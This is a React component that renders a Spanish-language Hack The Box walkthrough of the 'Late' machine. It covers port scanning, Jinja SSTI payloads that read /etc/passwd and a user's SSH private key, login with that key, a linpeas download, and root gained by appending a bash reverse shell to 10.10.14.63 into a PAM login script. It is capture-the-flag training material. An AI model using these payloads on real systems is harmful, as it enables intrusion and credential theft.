import { Highlighter } from "../../utils/SyntaxHighlighter"
import { Paragraph } from "../../Components/Paragraph"
import { ContentBlock } from "../../Layout/ContentBlock"
import { SubTitle } from "../../Components/SubTitle"

export function Late() {
    return <>
      <ContentBlock>
        <SubTitle>Escaneo de puertos</SubTitle>
        <Paragraph> Hacemos nuestro escaneo de puertos como es usual y verificamos cuales estan abiertos y que servicios estan corriendo en cada uno por ejemplo en esta  Maquina tenemos el puerto 80 y 22</Paragraph>
        <Highlighter
          text=' nmap -p- --open --min-rate 5000 -Pn 10.10.11.156 -oG puertosAbiertos'
        />
        <Paragraph>Vemos que en el puerto 80 esta corriendo un servidor web <strong>late.htb</strong> lo agregamos a nuestro archivito <strong>/etc/hosts</strong> de nuestra maquina</Paragraph>
        <Highlighter text='10.10.11.156 late.htb' />
      </ContentBlock>
  
      <ContentBlock className="content block">
        <SubTitle>Enumeracion</SubTitle>
        <Paragraph>
          Mientras hacemos un recorrido por la pàgina notamos que en la parte de abajo tenemos unos nuevos enlaces que apuntan a <strong>images.late.htb </strong>,
          lo añadimos a <strong>/etc/hosts </strong>para luego ingresar a la url, y vemos la siguiente vista:
          <button className="js-modal-trigger" data-target="modal-js-example">
            <img
              layout="fill"
              src='/fuzzing_enumeration.png'
              alt='Enumeracion de la maquina Late en Hack The Box'
            />
          </button>
        </Paragraph>
      </ContentBlock>
  
      <ContentBlock>
        <SubTitle>Archivo hosts</SubTitle>
        <Paragraph>En el archivo <strong>/etc/hosts</strong> de nuestra maquina añadimos:</Paragraph>
        <Highlighter text='10.10.11.156 images.late.htb' />
        <Paragraph>Nos vamos a la nueva URL: </Paragraph>
        <figure className={`image is-square block`}>
          <img
            layout="fill"
            src="/late_1.webp"
            alt="Vista images.late.htb de la maquina Late en hack the box"
          />
        </figure>
      </ContentBlock>
  
      <ContentBlock>
        <Paragraph>
          Vemos en el titulo que esta pàgina usa Flask, necesitamos saber como funciona este conversor de imagen a texto
          creamos nuestra imagen con Photoshop, GIMP, etc. Testeamos la App para vulnerabilidades comunes como XSS, SQLi y CMDi
          abrimos e ingresamos payloads para estas vulnerabilidades enganchamos que una SSTI funciona <strong>&#123; &#123; 7 * 7 &#125; &#125;</strong>
        </Paragraph>
        <Paragraph>
          Lo subimos a la web y nos retorna un archivo llamado <strong>result.txt</strong> con el siguiente contenido.
        </Paragraph>
      </ContentBlock >
  
      <ContentBlock>
        <Paragraph>
          La palabra “Late” nos dice porque un SSTi pudo funcionar (Temp”late”). Al intentar conseguir nuetro RCE al subir una imagen con el siguiente payload por ejemplo
        </Paragraph>
        <Highlighter
          text="{{ ‘’.__class__.__mro__[2].__subclasses__()[40](‘/etc/passwd’).read() }}"
        />
        <Paragraph>
          La web lo procesa y al convertir imagen a texto algunos caracteres son añadidos y otros se pierden
        </Paragraph>
        <Highlighter
          text="f{ ‘’_lsd__. _mro__.subclasses__([‘/etc/passwd’).read() }}"
        />
        <Paragraph>
          Despues de verificar esto notamos que tenemos execucion de remota de comandos y podemos ver el archivo /etc/passwd
          Notamos que hay un usuario "svc_acc" con su llave ssh privada y capacidad de login.
          Volvemos a subir nuestro payload, cambiando el path al archivo id_rsa.
        </Paragraph>
        <Highlighter
          text="{{ ‘’.__class__.__mro__[2].__subclasses__()[40](‘/home/svc_acc/.ssh/id_rsa’).read() }}"
        />
        IMAGEN
        <Paragraph>
          Ahora que tenemos el id_rsa hacemos un lógin con el usuario svc_acc
        </Paragraph>
        <Highlighter
          text="chmod 600 id_rsa"
        />
        <Highlighter
          text="ssh svc_acc@10.10.10.156 -i id_rsa"
        />
      </ContentBlock>
      <ContentBlock>
        <SubTitle>Root</SubTitle>
        <Paragraph>
          Descargamos linpeas e intentamos enumerar rutas con privilegios.
          Montamos nuestro servidor
        </Paragraph>
        <Highlighter text="python3 -m http.server 8080" />
        <Paragraph>Luego en la maquina Late</Paragraph>
        <Highlighter text="svc_acc@late:~$ wget http://10.10.14.63:8080/linpeas.sh"
        />
        <Highlighter text="chmod +x linpeas.sh" />
        <Highlighter text="./linpeas.sh" />
        <Paragraph>
          Encontramos el archivo ssh-alert.sh.
        </Paragraph>
        <Highlighter text="svc_acc@late:~$ cat /usr/local/sbin/ssh-alert.sh
          #!/bin/bash
          RECIPIENT=”root@late.htb”
          SUBJECT=”Email from Server Login: SSH Alert”
          BODY=”
          A SSH login was detected.
          User: $PAM_USER
          User IP Host: $PAM_RHOST
          Service: $PAM_SERVICE
          TTY: $PAM_TTY
          Date: `date`
          Server: `uname -a`
          “
          if [ ${PAM_TYPE} = “open_session” ]; then
          echo “Subject:${SUBJECT} ${BODY}” | /usr/sbin/sendmail ${RECIPIENT}
          fi
          " />
          <Paragraph>
            Vemos que se ejecuta cada vez que entablamos una sesion.
            inspeccionamos los atributos que tiene aunque no tiene el de
            escribir podemos crear un archivo y anexarlo.
          </Paragraph>
          <Highlighter text="svc_acc@late:~$ lsattr /usr/local/sbin/ssh-alert.sh
            — — -a — — — — e — — /usr/local/sbin/ssh-alert.sh"
          />
          <Paragraph>
            Creamos un archivo file.txt con el payload de Reverse Shell y lo añadimos
            al archivo ssh-alert.sh
          </Paragraph>
          <Highlighter text="bash -i >& /dev/tcp/10.10.14.63/9999 0>&1" />
          <Highlighter text="cat file.txt >> /usr/local/sbin/ssh-alert.sh" />
          <Paragraph>
            Configuramos un netcat en la Late y de nuestra maquina hamos login.
          </Paragraph>
          <Highlighter text="nc -lvnp 9999"/>
      </ContentBlock>
      <SubTitle>Congratulations leonardo Late has been Pwned!</SubTitle>
  
      <div
        id="modal-js-example"
        className="modal"
      >
        <div className="modal-background"></div>
        <div className="modal-content">
          <figure className={`image is-square block`}>
            <img
              layout="fill"
              src="/late_1.webp"
              alt="Vista home de la maquina Late en hack the box"
            />
          </figure>
        </div>
        <button
          className="modal-close is-large"
          aria-label="close"
        >HOla</button>
      </div>
    </>
  }